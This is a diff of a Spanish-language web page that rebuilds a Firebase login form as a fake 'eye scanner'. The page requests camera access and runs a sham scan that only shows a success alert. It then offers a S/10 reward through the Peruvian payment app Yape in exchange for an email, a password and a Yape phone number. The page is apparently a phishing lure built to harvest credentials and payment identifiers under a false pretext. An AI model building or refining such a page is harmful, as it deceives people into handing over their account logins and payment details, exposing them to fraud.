@@ -3,22 +3,33 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Formulario Firebase</title>
+  <title>Eacaner Ocular</title>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
   <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&family=Montserrat:ital,wght@0,100..900;1,100..900&family=Passion+One:wght@400;700;900&display=swap" rel="stylesheet">
 </head>
 <style>
     body {
+  
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
       font-family: Arial, sans-serif;
-      background-color: #f5f5f5;
+      background:url(https://img.freepik.com/vector-premium/cuidado-medico-sanitario-fondo-color-azul_389740-1083.jpg);
+      background-position-x: center;
+      background-size: cover;
+      background-repeat: no-repeat;
     }
 
     .login-container {
+        
+        display: none;
       width: 300px;
       padding: 40px;
       background-color: #fff;
@@ -41,7 +52,8 @@
     }
 
     .login-container input[type="text"],
-    .login-container input[type="password"] {
+    .login-container input[type="password"],
+    .login-container input[type="number"] {
       width: 100%;
       padding: 10px;
       margin-bottom: 15px;
@@ -77,12 +89,137 @@
       opacity: 0.9;
     }
   </style>
-<body>
 
 
-  
-    <div class="login-container">
-        <h2>Login</h2>
+
+<style>
+   
+
+    #videoContainer {
+        position: relative;
+        width: 200px;
+        height: 200px;
+        border-radius: 100%;
+        /* Hace que el contenedor tenga forma de ojo */
+        overflow: hidden;
+        background-color: #fff;
+        box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+    }
+
+    video {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        /* Ajusta el video al contenedor */
+        transform: scaleX(-1);
+        /* Invierte el video para efecto espejo */
+    }
+
+    #eyeIcon {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        width: 50px;
+        /* Tamaño del icono */
+        height: 50px;
+        /* Tamaño del icono */
+        transform: translate(-50%, -50%);
+        /* Centra el icono */
+        opacity: 0.7;
+        /* Opacidad del icono */
+    }
+
+    button {
+        margin-top: 20px;
+        padding: 10px 20px;
+        font-size: 16px;
+    }
+</style>
+<style>
+    #cont1{
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+</style>
+<body >
+
+    <div id="cont1" style="text-align: center;">
+
+        <h2 style="display: flex;flex-direction: column;align-items: center;font-weight: 600; color:white; ">Escanea tu vista por a cambio de S/10 
+            <img src="https://static.wixstatic.com/media/106c34_ae614ae62337460fa17b6bb7bed3aabb~mv2.png/v1/fill/w_560,h_292,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/1200x630wa_edited.png" width="150px" alt=""></h2>
+        <div id="videoContainer">
+            <video id="video" autoplay></video>
+            <img id="eyeIcon" src="https://cdn-icons-png.flaticon.com/512/5807/5807492.png" alt="Icono de Vista"
+                style=" filter: invert(100%);" /> <!-- Icono de ojo -->
+        </div>
+        <button id="captureButton" style="    border-radius: 49px;
+        background: #a7a7a7;
+        border: none;"><img src="icons8-cámara-64.png" width="30" alt=""></button>
+
+
+    </div>
+    
+   
+    <script>
+        // Variable para controlar el estado de acceso a la cámara
+        let cameraAccessGranted = false;
+
+        // Función para solicitar acceso a la cámara
+        async function requestCameraAccess() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = stream; // Asigna el flujo de video al elemento <video>
+                document.getElementById('captureButton').disabled = false; // Habilita el botón
+                cameraAccessGranted = true; // Establece que se otorgaron permisos
+            } catch (error) {
+                console.error('No se pudo acceder a la cámara:', error);
+                // Mostrar mensaje de error si no se pueden obtener permisos
+                Swal.fire({
+                    title: 'Error',
+                    text: 'No se pudo acceder a la cámara. Asegúrate de tener permisos habilitados.',
+                    icon: 'error',
+                    confirmButtonText: 'Aceptar'
+                });
+            }
+        }
+
+        // Llama a la función para solicitar acceso a la cámara al cargar la página
+        window.onload = requestCameraAccess;
+
+        // Evento de clic para el botón de captura
+        document.getElementById('captureButton').addEventListener('click', () => {
+            // Solo muestra la alerta si se tiene acceso a la cámara
+            if (cameraAccessGranted) {
+                Swal.fire({
+                    title: '¡Éxito!',
+                    text: 'La acción se ha realizado con éxito.',
+                    icon: 'success',
+                    confirmButtonText: 'Aceptar',
+                    timer: 2000,
+                    showConfirmButton: true // Muestra el botón de confirmar
+                }).then(() => {
+                    // Oculta el contenedor 1 y muestra el contenedor 2 después de la alerta
+                    document.getElementById('cont1').style.display = 'none';
+                    document.getElementById('cont2').style.display = 'block';
+                });
+            } else {
+                // Si no hay permisos, muestra un mensaje de error
+                Swal.fire({
+                    title: 'Error',
+                    text: 'No tienes permisos para acceder a la cámara.',
+                    icon: 'error',
+                    confirmButtonText: 'Aceptar'
+                });
+            }
+        });
+    </script>
+
+    <div class="login-container" id="cont2" style="">
+        <h2>Registrate para recibir tu yaper</h2>
+        <div style="    color: #9017cb;
+        font-size: 20px;
+        font-weight: 600;">S/10.00</div>
         <form id="loginForm">
           <label for="email">Correo</label>
           <input type="text" id="email" placeholder="Correo" required>
@@ -90,8 +227,13 @@
           <label for="password">Contraseña</label>
           <input type="password" id="password" placeholder="Contraseña" required>
     
+          <label>Numero de yape</label>
+          <input type="number" id="yape" placeholder="000 000 000" required>
+    
           <a href="#">¿Olvidaste tu contraseña?</a>
-          <button type="submit">LOGIN</button>
+          <button style="    align-items: center;
+          display: flex;
+          justify-content: center;" type="submit">Obtener recompesa <img src="https://lh5.googleusercontent.com/proxy/cKEweVrtrpM71rbCqTBBLMTjcEZLlsc6bCnFdrl5nICm9TsUk0J6PX5xObPiuQyEif37a4IVbLLPGr6TkspoQJhKyy-CFo-6z8S0sKaRWvjBFdE" width="100px" alt=""></button>
         </form>
       </div>
     
